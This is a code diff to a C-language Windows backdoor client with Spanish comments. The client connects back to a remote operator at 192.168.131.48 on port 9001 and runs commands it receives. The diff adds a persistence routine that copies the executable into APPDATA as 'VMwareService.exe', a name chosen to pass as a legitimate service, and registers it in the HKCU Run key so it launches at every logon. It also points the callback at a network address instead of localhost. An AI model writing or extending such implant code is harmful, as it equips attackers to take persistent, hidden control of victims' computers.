@@ -22,6 +22,7 @@ void ash(int conn);
 void _chdir(int conn, char *instruct);
 void strtSnd(int conn, char *instruct);
 int mainLoop(int conn);
+int getLWPrstnc(int conn);
 int excndSend(int conn, char *cmd);
 int readNdSndFle(int conn, char *file);
 int uploadFunc(char *command, SOCKET conn);
@@ -241,11 +242,39 @@ int readNdSndFle(int conn, char *file){
     return 0;
 }
 
+int getLWPrstnc(int conn){
+    char* appdata = getenv("APPDATA");
+    char* vm_service = "\\VMwareService.exe";
+    char* lction = malloc(strlen(appdata) + strlen(vm_service) + 1);
+    strcpy(lction, appdata);
+    strcat(lction, vm_service);
+    if (lction == NULL){
+        send(conn, "error", SOCKBUFF, 0);
+        return 1;
+    } else {
+        char path[255];
+        GetModuleFileName(NULL, path, 255);
+        BOOL reslt = CopyFile(path, lction, FALSE);
+        if (!reslt) {
+            send(conn, "error", SOCKBUFF, 0);
+            return 1;
+        } else {
+            char* formed = malloc(2048 * sizeof(char));
+            snprintf(formed, SOCKBUFF, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MService /t REG_SZ /d %s /f", lction);
+            system(formed);
+            send(conn, "exito", SOCKBUFF, 0);
+            return 0;    
+        }
+        
+    }
+}
+
 int mainLoop(int conn){
     char instruct[SOCKBUFF];
     while (true){
         memset(instruct, 0, SOCKBUFF);
         recv(conn, instruct, sizeof(instruct), 0); 
+        printf("%s", instruct);
         if (strcmp(instruct, "exit") == 0)
             return 0;
     
@@ -268,6 +297,10 @@ int mainLoop(int conn){
             strtAll(conn);
             send(conn, "end\0", strlen("end\0"), 0);
         
+        } else if (strcmp(instruct, "lowpersistence") == 0){
+            getLWPrstnc(conn);          
+            Sleep(300);
+        
         } else
             continue;
     }
@@ -289,19 +322,17 @@ void conection()
 
     cltAddr.sin_family = AF_INET;
     cltAddr.sin_port = htons(9001); // Especifcamos puerto
-    cltAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Especifcamos IP
+    cltAddr.sin_addr.s_addr = inet_addr("192.168.131.48"); // Especifcamos IP
 
     int targetConnStatus = connect(conn, (struct sockaddr *)&cltAddr,
                                    sizeof(cltAddr));
 
-    if (targetConnStatus == -1)
-    {
+    if (targetConnStatus == -1){
         Sleep(10000);
         conection();
         // printf("%s[!>] %sERROR...\n", YELLOW, RED);
     }
-    else
-    {
+    else{
         mainLoop(conn);
         Sleep(10000);
         conection();
